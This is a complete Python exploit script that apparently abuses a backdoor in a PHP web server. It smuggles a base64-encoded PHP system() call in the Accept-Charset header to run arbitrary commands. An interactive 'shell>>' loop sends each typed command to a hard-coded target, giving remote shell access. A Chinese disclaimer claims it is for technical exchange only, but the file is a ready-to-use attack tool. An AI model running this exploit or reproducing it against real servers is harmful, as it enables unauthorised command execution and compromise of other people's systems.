# -*- coding: utf-8 -*-
__author__ = 'CoolCat'


"""
仅作技术交流使用，请勿非法使用。
一切非法使用导致的后果与本人无关。
"""

import requests
import base64

def exploit(target,cmd):

    session = requests.Session()

    phpcode = "system('{}');".format(cmd)

    headers = {"Accept-Charset": str(base64.b64encode(phpcode.encode('utf-8')), 'utf-8'),
               "Cache-Control": "max-age=0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
               "Connection": "close",
               "Accept-Language": "zh-CN,zh;q=0.9",
               "Accept-Encoding": "gzip,deflate"
               }
    response = session.get(url=target, headers=headers)

    print(response.text.split('\r\n')[0])

if __name__ == '__main__':


    target = 'http://192.168.1.101/'

    while True:
        cmd = input('shell>>')
        exploit(target, cmd)